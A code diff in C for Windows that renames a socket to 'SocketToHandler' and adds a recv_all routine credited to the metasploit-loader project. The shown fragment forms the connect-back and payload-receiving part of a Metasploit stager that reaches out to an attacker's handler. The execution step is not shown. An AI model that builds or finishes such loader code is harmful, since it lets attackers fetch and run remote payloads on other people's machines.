@@ -9,7 +9,7 @@ Steps are as follows:
 SOCKET get_socket(wchar_t* IP, wchar_t* iPort)  // MSDN http://msdn.microsoft.com/en-us/library/windows/desktop/ms737591(v=vs.85).aspx
 {
 	WSADATA wsaData;
-	SOCKET ConnectSocket = INVALID_SOCKET;
+	SOCKET SocketToHandler = INVALID_SOCKET;
 	char ansiIP[1024] = {0};
 	char ansiPort[128] = {0};
 
@@ -45,18 +45,39 @@ SOCKET get_socket(wchar_t* IP, wchar_t* iPort)  // MSDN http://msdn.microsoft.co
 	}
 
 	// Create a SOCKET for connecting to server
-	ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
-	if (ConnectSocket == INVALID_SOCKET) {
+	SocketToHandler = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+	if (SocketToHandler == INVALID_SOCKET) {
 		printf("socket failed with error: %ld\n", WSAGetLastError());
 		WSACleanup();
 		return INVALID_SOCKET;
 	}
 
 	// Connect to handler
-	iResult = connect( ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
+	iResult = connect( SocketToHandler, result->ai_addr, (int)result->ai_addrlen);
 	if (iResult == SOCKET_ERROR) {
-		closesocket(ConnectSocket);
+		closesocket(SocketToHandler);
 		return INVALID_SOCKET;
 	}
-	return ConnectSocket;
+	return SocketToHandler;
+} 
+
+// The author of the code below is Raphael Mudge (raffi@strategiccyber.com),
+// https://github.com/rsmudge/metasploit-loader
+int recv_all(SOCKET socket, unsigned char* buffer, int len) {
+	int    tret   = 0;
+	int    nret   = 0;
+	unsigned char* startb = buffer;
+	while (tret < len) {
+		nret = recv(socket, (char *)startb, len - tret, 0);
+		startb += nret;
+		tret   += nret;
+/*
+		if (nret == SOCKET_ERROR)
+		{
+			dprintf(L"[-] Error receiving data! WSAGetLastError: %d\n", WSAGetLastError());
+			exit(1);
+		}
+		*/
+	}
+	return tret;
 }
